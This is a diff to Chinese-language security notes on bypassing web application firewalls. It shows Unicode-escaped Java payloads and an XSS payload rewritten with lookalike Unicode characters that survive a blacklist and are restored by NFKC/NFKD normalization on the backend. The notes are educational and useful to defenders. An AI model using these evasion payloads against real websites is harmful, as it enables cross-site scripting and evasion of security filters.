@@ -121,15 +121,92 @@ WAF的基础架构：串联(会话链路)、旁路(无法阻断)
 * 2.绕过该WAF的规则
   * 分块传输
   * `multipart/form-data`
+  * Unicode Compatibility(利用Unicode的兼容性)
   * payload变形
   * ...
 
+#### 案例1 **payload变形**
 
-payload变形案例 - 某JavaWeb网站存在漏洞，该网站且有WAF，如何绕过WAF成功利用Exp(有明显特征会被WAF拦截)?
+某JavaWeb网站存在漏洞(有WAF防护)，如何绕过WAF成功利用Exp?
 ```
-//比如Exp为
+//有明显特征的请求 会被WAF拦截. 比如下面这行是payload字符串 因为有Exp特征 所以被WAF拦截:
 System.out.println("1135");
 
-//使用Unicode编码进行等价替代 实现了"去除"特征字符串 可绕过多数WAF
+//使用Unicode编码对payload字符串进行转换 "去除"了特征字符串 可绕过WAF规则的检测:
 \u0053\u0079\u0073\u0074\u0065\u006d\u002e\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e("\u0031\u0031\u0033\u0035");
 ```
+
+#### 案例2 **Unicode Compatibility**
+
+参考[WAF Bypassing with Unicode Compatibility](https://jlajara.gitlab.io/posts/2020/02/19/Bypass_WAF_Unicode.html)
+* BypassWAF的前提: web后端使用了Unicode的兼容性.使用"规范化格式"`NFKC`或`NFKD`,将"不规范字符组成的payload字符串" 转换为 "规范字符组成的payload字符串".
+* BypassWAF的原理: 
+  * 1.攻击者可以构造"不规范字符组成的payload字符串",先绕过了WAF的规则检测.(如果后端不做任何处理的话 payload无效 无法触发)
+  * 2.web后端 将 **"不规范字符组成的payload字符串" 进行"规范化格式"`NFKC`或`NFKD`处理，得到"规范字符组成的payload字符串"**.
+
+* Unicode有4种标准的"规范化格式":
+  * NFC: Normalization Form Canonical Composition
+  * NFD: Normalization Form Canonical Decomposition
+  * NFKC: Normalization Form Compatibility Composition
+  * NFKD: Normalization Form Compatibility Decomposition
+
+4个"规范化格式"中有`NFKC`与`NFKD`这2个会对数据做"兼容"(compatibility),即`不规范字符 -> 规范字符`,如代码:
+```
+# -*- coding: UTF-8 -*-
+# python 3
+
+import unicodedata
+string = "𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃"
+print ('NFC: ' + unicodedata.normalize('NFC', string))
+print ('NFD: ' + unicodedata.normalize('NFD', string))
+print ('NFKC: ' + unicodedata.normalize('NFKC', string))
+print ('NFKD: ' + unicodedata.normalize('NFKD', string))
+```
+输出为
+```
+NFC: 𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃
+NFD: 𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃
+NFKC: Leonishan
+NFKD: Leonishan
+```
+
+启动一个web服务
+```
+# 部分代码
+
+# 1.先经过WAF 假设WAF规则中的黑名单字符为
+blacklist = ["~","!","@","#","$","%","^","&","*","(",")","_","_","+","=","{","}","]","[","|","\",",".","/","?",";",":",""",""","<",">"]
+
+# 2.再到web服务后端 注意:这里使用了规范化格式"NFKD"【将数据转换为规范化格式】
+# 将"不规范字符组成的payload字符串" 转换为 "规范字符组成的payload字符串"
+unicodedata.normalize('NFKD', name) #NFC, NFKC, NFD, and NFKD
+```
+
+
+测试
+```
+# 直接输入普通payload
+<img src=p onerror='prompt(1)'>
+# 因为其中有黑名单字符 被WAF规则匹配到 并 block
+```
+
+BypassWAF
+利用 https://www.compart.com/en/unicode 搜索字符 找到对应的"不规范字符"
+```
+# 构造出了"替代字符串"
+＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥
+
+# 绕过过程
+# 1.流量经过WAF - 因为"不规范字符组成的payload字符串"不常见  WAF的规则常常不会匹配到.
+
+
+# 2.流量到web服务后端
+# 注意:这里使用了规范化格式"NFKD"【将数据转换为规范化格式】
+# 将"不规范字符组成的payload字符串" 转换为 "规范字符组成的payload字符串"
+
+<img src=p onerror='prompt(1)'>
+
+# payload有效 可触发
+```
+
+
